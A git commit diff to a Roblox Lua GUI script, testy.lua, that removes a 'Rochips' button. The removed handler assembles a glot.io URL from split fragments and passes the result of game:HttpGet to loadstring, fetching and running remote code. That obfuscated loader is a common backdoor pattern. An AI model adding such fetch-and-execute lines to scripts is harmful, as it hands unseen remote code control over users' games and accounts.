1e3113a4bb3d131cea3501e6039d453ebf9b6505
Darklaw-game <darklaw.game@gmail.com>
2024-12-28 18:43:09 -0600

    Update testy.lua

--- testy.lua
+++ testy.lua
@@ -10,12 +10,7 @@ MainSection:NewButton("Kick", "Kicky", function()
     game.player.Localplayer:kick("Lol")
 end)
 
-MainSection:NewButton("Rochips", "Activates rochips", function()
-    if "Rochips Loader" then
-        local Rochips_panel,v,u,i=loadstring,"/snippets","gwwv","/raw/main.lua" ;
-        Rochips_panel(game:HttpGet("https://glot.io"..v.."/" ..u.."877ga3"..i))();
-        return "it will load in around 3 - 131 seconds"
-    end
-end)
+
+
 
 
